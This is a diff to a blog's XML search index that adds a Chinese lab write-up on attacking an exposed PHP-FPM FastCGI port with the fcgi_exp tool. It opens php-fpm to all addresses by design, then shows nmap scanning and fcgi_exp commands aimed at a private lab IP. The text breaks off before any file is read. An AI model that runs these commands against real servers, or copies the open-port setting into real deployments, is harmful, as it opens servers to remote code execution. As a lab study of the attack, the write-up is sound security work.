@@ -5,7 +5,7 @@
     <entry>
       <title><![CDATA[利用fcgi_exp对php-fpm进行远程利用]]></title>
       <url>%2F2016%2F11%2F19%2F%E5%88%A9%E7%94%A8fcgi-exp%E5%AF%B9php-fpm%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8%2F</url>
-      <content type="text"></content>
+      <content type="text"><![CDATA[&gt; PHP-FPM是一个PHPFastCGI管理器，是只用于PHP的。 Php-fpm环境搭建nginx + php-pfm 搭建好了之后配置php-fpm1sudo vim /etc/php-fpm.d/www.conf 12Listen=0.0.0.0:9000 (修改); listen.allowed_clients = 127.0.0.1 (前面添加注释 分号) 搭建nginx + php-fpm 环境 1yum install php-fpm 安装golang123cd /usr/local/src/wget -c http://golangtc.com/static/go/go1.4beta1.linux-amd64.tar.gztar zxvf /root/go1.4beta1.linux-amd64.tar.gz 设置系统环境变量 vim /etc/profile 123export GOROOT=/usr/local/src/goexport GOBIN=$GOROOT/binexport PATH=$PATH:$GOBIN 编译使其生效：1source /etc/profile 验证：1go version 安装fcgi_exp1[root@localhost go]#go build /usr/local/fcgi_exp/fcgi_exp.go 至此，测试环境搭建完成！ 漏洞利用nmap扫描查看9000端口是否开启关闭防火墙:Service iptables stop 查id 尝试向web路径下写文件1vim /etc/nginx/nginx.conf 通过nginx的配置文件查找到web路径：/usr/share/nginx/html 1echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; /usr/share/nginx/html/2.php 尝试写入phpinfo1./fcgi_exp phpinfo 192.168.141.110 9000 /usr/share/nginx/html/1.php &gt; 1.html fcgi_exp目录下会生成1.html vim 1.html 查看服务器配置信息。 但是依旧不能读取文件：]]></content>
     </entry>
 
     
